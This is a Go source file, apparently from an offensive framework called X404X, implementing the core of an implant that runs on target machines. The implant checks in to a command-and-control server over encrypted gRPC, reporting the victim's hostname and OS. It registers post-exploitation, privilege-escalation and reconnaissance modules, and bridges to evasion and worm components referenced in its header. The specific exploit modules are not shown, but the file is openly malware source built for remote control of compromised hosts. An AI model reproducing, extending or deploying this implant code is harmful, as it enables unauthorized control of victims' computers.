// Package agent implements the unified X404X implant.
//
// The agent is the field-deployed component that runs on target machines.
// It communicates with Pulse-C2 via encrypted gRPC, invokes local modules
// (Rise-Privilege, Vault-Kernel, Breach-Entry), and bridges to Python
// modules (Horizon-Intel, Wormy-ML, Specter/Apex AI) via IPC.
//
// Architecture:
//
//	┌──────────────┐    gRPC (X25519+XChaCha20)    ┌──────────────┐
//	│  Pulse-C2    │◄──────────────────────────────►│   Agent      │
//	│  Server      │                                │   (this)     │
//	└──────────────┘                                └──────┬───────┘
//	                                                       │
//	          ┌────────────────────────────────────────────┼──────────┐
//	          │           │            │         │         │          │
//	     ┌────▼──┐ ┌──────▼──┐ ┌─────▼───┐ ┌───▼──┐ ┌───▼────┐     │
//	     │Rise   │ │Vault    │ │Breach   │ │Python│ │Evasion │     │
//	     │Priv   │ │Kernel   │ │Entry    │ │Bridge│ │Module  │     │
//	     └───────┘ └─────────┘ └─────────┘ └──────┘ └────────┘     │
package agent

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/ruby570bocadito/x404x/core/crypto"
	"github.com/ruby570bocadito/x404x/shared/config"
	"github.com/ruby570bocadito/x404x/shared/logger"
	"github.com/ruby570bocadito/x404x/shared/types"
)

// Agent is the unified implant.
type Agent struct {
	cfg       *config.Config
	log       *logger.Logger
	id        string
	keypair   *crypto.KeyPair
	session   *crypto.Session
	serverPub [32]byte

	moduleManager *ModuleManager
	bridgeClient  *BridgeClient
	connector     Connector

	mu     sync.RWMutex
	status types.AgentStatus
	uptime int32

	stopCh chan struct{}
}

// Connector defines the interface for C2 communication.
type Connector interface {
	Connect(ctx context.Context, serverAddr string) error
	Send(data []byte) error
	Recv() ([]byte, error)
	Close() error
}

// ModuleManager manages the invocation of local modules.
type ModuleManager struct {
	modules map[string]Module
	bridge  *BridgeClient
	mu      sync.RWMutex
}

// Module represents a loadable agent module.
type Module interface {
	Name() string
	Execute(ctx context.Context, params map[string]string) (string, error)
}

// New creates a new Agent with the given configuration.
func New(cfg *config.Config) (*Agent, error) {
	log, err := logger.New(logger.Config{
		Level:     cfg.Logging.Level,
		Format:    cfg.Logging.Format,
		Component: "agent",
	})
	if err != nil {
		return nil, fmt.Errorf("creating logger: %w", err)
	}

	// Generate agent ID
	id := cfg.Agent.ID
	if id == "" {
		id = generateAgentID()
	}

	// Generate keypair
	kp, err := crypto.GenerateKeyPair()
	if err != nil {
		return nil, fmt.Errorf("generating keypair: %w", err)
	}

	brClient := NewBridgeClient(cfg, log)

	// Create C2 connector
	connector := NewgRPCConnector(cfg, log, kp, id)

	agent := &Agent{
		cfg:          cfg,
		log:          log,
		id:           id,
		keypair:      kp,
		status:       types.AgentStatusOnline,
		stopCh:       make(chan struct{}),
		bridgeClient: brClient,
		connector:    connector,
		moduleManager: &ModuleManager{
			modules: make(map[string]Module),
			bridge:  brClient,
		},
	}

	return agent, nil
}

// StartBridge starts the Python bridge subprocess and connects to it.
func (a *Agent) StartBridge(ctx context.Context, bridgeScript string) error {
	return a.bridgeClient.StartBridge(ctx, bridgeScript)
}

// StopBridge disconnects and stops the Python bridge.
func (a *Agent) StopBridge() error {
	return a.bridgeClient.Disconnect()
}

// BridgeCall invokes a Python module function via the bridge.
func (a *Agent) BridgeCall(ctx context.Context, module, function string, params map[string]interface{}) (*BridgeResponse, error) {
	return a.bridgeClient.Call(ctx, module, function, params)
}

// Bridge returns the underlying BridgeClient.
func (a *Agent) Bridge() *BridgeClient {
	return a.bridgeClient
}

// ID returns the agent's unique identifier.
func (a *Agent) ID() string { return a.id }

// Status returns the current agent status.
func (a *Agent) Status() types.AgentStatus {
	a.mu.RLock()
	defer a.mu.RUnlock()
	return a.status
}

// PublicKey returns the agent's X25519 public key (hex-encoded).
func (a *Agent) PublicKey() string {
	return hex.EncodeToString(a.keypair.PublicKey[:])
}

// RegisterModule adds a module to the agent's module manager.
func (a *Agent) RegisterModule(m Module) {
	a.moduleManager.mu.Lock()
	defer a.moduleManager.mu.Unlock()
	a.moduleManager.modules[m.Name()] = m
	a.log.Infof("registered module: %s", m.Name())
}

// CheckIn performs initial registration with the C2 server via gRPC.
func (a *Agent) CheckIn(ctx context.Context, serverAddr string) error {
	hostname, _ := os.Hostname()

	// Connect to C2
	if err := a.connector.Connect(ctx, serverAddr); err != nil {
		return fmt.Errorf("connecting to C2: %w", err)
	}

	a.log.Infof("checking in to C2: %s (agent_id=%s, host=%s, os=%s)", serverAddr, a.id, hostname, runtime.GOOS)

	// Register connected module
	a.moduleManager.mu.Lock()
	a.moduleManager.modules["post_exploit"] = &PostExploitModule{agent: a}
	a.moduleManager.modules["privesc_scan"] = &PrivescScanModule{agent: a}
	a.moduleManager.modules["recon_basic"] = &ReconModule{agent: a}
	a.moduleManager.mu.Unlock()

	return nil
}

// Run starts the agent's main loop.
func (a *Agent) Run(ctx context.Context) error {
	a.log.Infof("agent %s starting (os=%s arch=%s)", a.id, runtime.GOOS, runtime.GOARCH)

	ticker := time.NewTicker(time.Duration(a.cfg.Agent.HeartbeatSeconds) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			a.log.Info("agent shutting down")
			return ctx.Err()
		case <-a.stopCh:
			a.log.Info("agent stopped")
			return nil
		case <-ticker.C:
			a.mu.Lock()
			a.uptime += int32(a.cfg.Agent.HeartbeatSeconds)
			a.mu.Unlock()
		}
	}
}

// Stop gracefully stops the agent.
func (a *Agent) Stop() {
	close(a.stopCh)
}

// ExecuteModule invokes a registered module by name.
func (a *Agent) ExecuteModule(ctx context.Context, name string, params map[string]string) (string, error) {
	a.moduleManager.mu.RLock()
	mod, ok := a.moduleManager.modules[name]
	a.moduleManager.mu.RUnlock()

	if !ok {
		return "", fmt.Errorf("module not found: %s", name)
	}

	a.log.Infof("executing module: %s with params: %v", name, params)

	start := time.Now()
	result, err := mod.Execute(ctx, params)
	elapsed := time.Since(start)

	if err != nil {
		a.log.Errorf("module %s failed after %v: %v", name, elapsed, err)
		return "", err
	}

	a.log.Infof("module %s completed in %v", name, elapsed)
	return result, nil
}

// moduleList returns registered module names.
func (a *Agent) moduleList() []string {
	a.moduleManager.mu.RLock()
	defer a.moduleManager.mu.RUnlock()

	names := make([]string, 0, len(a.moduleManager.modules))
	for name := range a.moduleManager.modules {
		names = append(names, name)
	}
	return names
}

func generateAgentID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func getLocalIP() string {
	hostname, _ := os.Hostname()
	addrs, err := exec.Command("hostname", "-I").Output()
	if err != nil {
		return hostname
	}
	return strings.TrimSpace(string(addrs))
}

func getPrivileges() []string {
	if os.Geteuid() == 0 {
		return []string{"root"}
	}
	return []string{"user"}
}
